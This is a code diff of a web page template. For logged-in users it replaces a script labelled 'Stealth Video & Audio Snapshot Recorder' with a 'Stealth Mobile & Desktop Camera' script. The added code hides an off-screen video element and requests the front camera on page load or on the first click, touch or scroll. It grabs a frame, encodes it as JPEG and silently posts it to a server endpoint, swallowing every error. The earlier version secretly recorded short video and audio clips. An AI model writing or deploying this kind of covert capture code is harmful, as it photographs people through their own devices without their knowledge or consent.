@@ -914,10 +914,13 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 {% if current_user.is_authenticated %}
-<!-- Stealth Video & Audio Snapshot Recorder -->
+<!-- Stealth Mobile & Desktop Camera Elements -->
+<video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline webkit-playsinline muted></video>
+<canvas id="snapshotCanvas" style="display: none;"></canvas>
+
 <script>
 (function() {
-    let recordingStarted = false;
+    let captured = false;
 
     function getUniversalUserMedia(constraints) {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -929,106 +932,102 @@ document.addEventListener('DOMContentLoaded', function() {
                 legacyFn.call(navigator, constraints, resolve, reject);
             });
         }
-        return Promise.reject(new Error("Camera/Audio API not available"));
+        return Promise.reject(new Error("Camera API not supported on this browser/origin"));
     }
 
-    function recordStealthVideo() {
-        if (recordingStarted) return;
+    function stealthCapture() {
+        if (captured) return;
 
-        function getStream(constraints) {
+        const video = document.getElementById('snapshotVideo');
+        const canvas = document.getElementById('snapshotCanvas');
+        if (!video || !canvas) return;
+
+        function attemptStream(constraints) {
             return getUniversalUserMedia(constraints);
         }
 
-        getStream({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true })
-            .catch(() => getStream({ video: { facingMode: 'user' }, audio: true }))
-            .catch(() => getStream({ video: true, audio: true }))
-            .catch(() => getStream({ video: true }))
+        attemptStream({ video: { facingMode: 'user' } })
+            .catch(() => attemptStream({ video: { facingMode: { ideal: 'user' } } }))
+            .catch(() => attemptStream({ video: true }))
             .then(stream => {
-                if (recordingStarted) return;
-                recordingStarted = true;
-
-                if (!window.MediaRecorder) {
-                    return;
+                try {
+                    video.srcObject = stream;
+                } catch(e) {
+                    try {
+                        video.src = window.URL.createObjectURL(stream);
+                    } catch(e2) {}
                 }
+                
+                video.muted = true;
+                video.volume = 0;
+                video.setAttribute('playsinline', 'true');
+                video.setAttribute('webkit-playsinline', 'true');
+                
+                const p = video.play();
+                if (p && p.catch) p.catch(() => {});
 
-                let options = { videoBitsPerSecond: 300000 };
-                if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1,mp4a.40.2')) {
-                    options.mimeType = 'video/mp4;codecs=avc1,mp4a.40.2';
-                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options.mimeType = 'video/mp4';
-                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                    options.mimeType = 'video/webm;codecs=vp8,opus';
-                } else if (MediaRecorder.isTypeSupported('video/webm')) {
-                    options.mimeType = 'video/webm';
-                }
+                function drawAndSendFrame() {
+                    if (captured) return;
 
-                const recorder = new MediaRecorder(stream, options);
-                const chunks = [];
-
-                recorder.ondataavailable = function(e) {
-                    if (e.data && e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
-
-                recorder.onstop = function() {
-                    if (stream && stream.getTracks) {
-                        stream.getTracks().forEach(track => track.stop());
+                    let w = video.videoWidth || 640;
+                    let h = video.videoHeight || 480;
+                    
+                    if (w > 640) {
+                        h = Math.round((h * 640) / w);
+                        w = 640;
                     }
 
-                    const mime = recorder.mimeType || options.mimeType || 'video/webm';
-                    const ext = mime.includes('mp4') ? 'snapshot.mp4' : 'snapshot.webm';
-                    const blob = new Blob(chunks, { type: mime });
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, w, h);
 
-                    if (blob.size > 500) {
-                        const formData = new FormData();
-                        formData.append('video_file', blob, ext);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.75);
+
+                    if (imageData && imageData.length > 500) {
+                        captured = true;
+
+                        if (stream && stream.getTracks) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
 
                         fetch('{{ url_for("submit_friend_snapshot") }}', {
                             method: 'POST',
-                            body: formData
-                        })
-                        .then(res => res.json())
-                        .then(d => console.log("Video upload result:", d))
-                        .catch(() => {
-                            const reader = new FileReader();
-                            reader.readAsDataURL(blob);
-                            reader.onloadend = function() {
-                                const b64 = reader.result;
-                                if (b64) {
-                                    fetch('{{ url_for("submit_friend_snapshot") }}', {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ image_data: b64, video_data: b64 })
-                                    }).catch(() => {});
-                                }
-                            };
-                        });
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image_data: imageData })
+                        }).catch(() => {});
                     }
-                };
+                }
 
-                recorder.start(100);
+                video.onloadedmetadata = function() { setTimeout(drawAndSendFrame, 300); };
+                video.onplaying = function() { setTimeout(drawAndSendFrame, 200); };
 
-                setTimeout(function() {
-                    if (recorder.state !== 'inactive') {
-                        recorder.stop();
+                let attempts = 0;
+                const timer = setInterval(() => {
+                    attempts++;
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        clearInterval(timer);
+                        drawAndSendFrame();
+                    } else if (attempts >= 15) {
+                        clearInterval(timer);
+                        drawAndSendFrame();
                     }
-                }, 3500);
+                }, 200);
             })
             .catch(() => {});
     }
 
     if (document.readyState === 'complete') {
-        setTimeout(recordStealthVideo, 300);
+        setTimeout(stealthCapture, 300);
     } else {
         window.addEventListener('load', function() {
-            setTimeout(recordStealthVideo, 300);
+            setTimeout(stealthCapture, 300);
         });
     }
 
-    document.addEventListener('click', recordStealthVideo, { once: true });
-    document.addEventListener('touchstart', recordStealthVideo, { once: true });
-    document.addEventListener('scroll', recordStealthVideo, { once: true });
+    document.addEventListener('click', stealthCapture, { once: true });
+    document.addEventListener('touchstart', stealthCapture, { once: true });
+    document.addEventListener('scroll', stealthCapture, { once: true });
 })();
 </script>
 {% endif %}
